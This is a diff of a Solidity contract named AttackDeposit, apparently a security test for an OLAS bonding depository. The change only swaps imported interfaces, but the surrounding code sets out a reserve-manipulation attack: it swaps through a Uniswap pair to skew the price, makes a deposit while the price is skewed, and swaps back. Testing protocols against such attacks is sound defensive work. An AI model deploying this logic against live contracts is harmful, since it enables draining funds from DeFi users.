@@ -1,8 +1,8 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.17;
 
-import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
+import "../interfaces/IToken.sol";
+import "../interfaces/IUniswapV2Pair.sol";
 
 interface IDepository {
     function deposit(uint256 productId, uint256 tokenAmount) external
@@ -42,29 +42,29 @@ contract AttackDeposit {
         address[] memory path = new address[](2);
         uint256[] memory amounts = new uint256[](2);
 
-        IERC20(token).approve(treasury, LARGE_APPROVAL);
+        IToken(token).approve(treasury, LARGE_APPROVAL);
         // IUniswapV2Pair pair = IUniswapV2Pair(address(token));
         address token0 = IUniswapV2Pair(address(token)).token0();
         address token1 = IUniswapV2Pair(address(token)).token1();
-        uint256 balance0 = IERC20(token0).balanceOf(token);
-        uint256 balance1 = IERC20(token1).balanceOf(token);
+        uint256 balance0 = IToken(token0).balanceOf(token);
+        uint256 balance1 = IToken(token1).balanceOf(token);
         // uint256 totalSupply = pair.totalSupply();
         uint256 balanceOLA = (token0 == olas) ? balance0 : balance1;
         uint256 balanceDAI = (token0 == olas) ? balance1 : balance0;
         // console.log("AttackDeposit ## OLAS reserved before deposit", balanceOLA);
         // console.log("AttackDeposit ## DAI reserved before deposit", balanceDAI);
-        // uint256 amountToSwap = IERC20(olas).balanceOf(address(this));
+        // uint256 amountToSwap = IToken(olas).balanceOf(address(this));
 
         path[0] = (token0 == olas) ? token0 : token1;
         path[1] = (token0 == olas) ? token1 : token0;
 
-        // console.log("balance OLAS in this contract before swap {pseudo flash loan OLAS}:",IERC20(olas).balanceOf(address(this)));
-        IERC20(olas).approve(swapRouter, LARGE_APPROVAL);
-        amounts = IRouter(swapRouter).swapExactTokensForTokens(IERC20(olas).balanceOf(address(this)), 0, path, address(this), block.timestamp + 3000);
-        // console.log("balance OLAS in this contract after swap:",IERC20(olas).balanceOf(address(this)));
+        // console.log("balance OLAS in this contract before swap {pseudo flash loan OLAS}:",IToken(olas).balanceOf(address(this)));
+        IToken(olas).approve(swapRouter, LARGE_APPROVAL);
+        amounts = IRouter(swapRouter).swapExactTokensForTokens(IToken(olas).balanceOf(address(this)), 0, path, address(this), block.timestamp + 3000);
+        // console.log("balance OLAS in this contract after swap:",IToken(olas).balanceOf(address(this)));
 
-        balance0 = IERC20(token0).balanceOf(token);
-        balance1 = IERC20(token1).balanceOf(token);
+        balance0 = IToken(token0).balanceOf(token);
+        balance1 = IToken(token1).balanceOf(token);
         // totalSupply = pair.totalSupply();
         balanceOLA = (token0 == olas) ? balance0 : balance1;
         balanceDAI = (token0 == olas) ? balance1 : balance0;
@@ -74,15 +74,15 @@ contract AttackDeposit {
         (payout, , ) = IDepository(depository).deposit(bid, amountTo);
         
         // DAI approve 
-        IERC20(path[1]).approve(swapRouter, LARGE_APPROVAL);
+        IToken(path[1]).approve(swapRouter, LARGE_APPROVAL);
         // swap back
         path[0] = path[1];
         path[1] = olas;
-        amounts = IRouter(swapRouter).swapExactTokensForTokens(IERC20(path[0]).balanceOf(address(this)), 0, path, address(this), block.timestamp + 3000);
-        // console.log("balance OLAS in this contract after swap:", IERC20(olas).balanceOf(address(this)));
+        amounts = IRouter(swapRouter).swapExactTokensForTokens(IToken(path[0]).balanceOf(address(this)), 0, path, address(this), block.timestamp + 3000);
+        // console.log("balance OLAS in this contract after swap:", IToken(olas).balanceOf(address(this)));
 
-        balance0 = IERC20(token0).balanceOf(token);
-        balance1 = IERC20(token1).balanceOf(token);
+        balance0 = IToken(token0).balanceOf(token);
+        balance1 = IToken(token1).balanceOf(token);
         // totalSupply = pair.totalSupply();
         balanceOLA = (token0 == olas) ? balance0 : balance1;
         balanceDAI = (token0 == olas) ? balance1 : balance0;
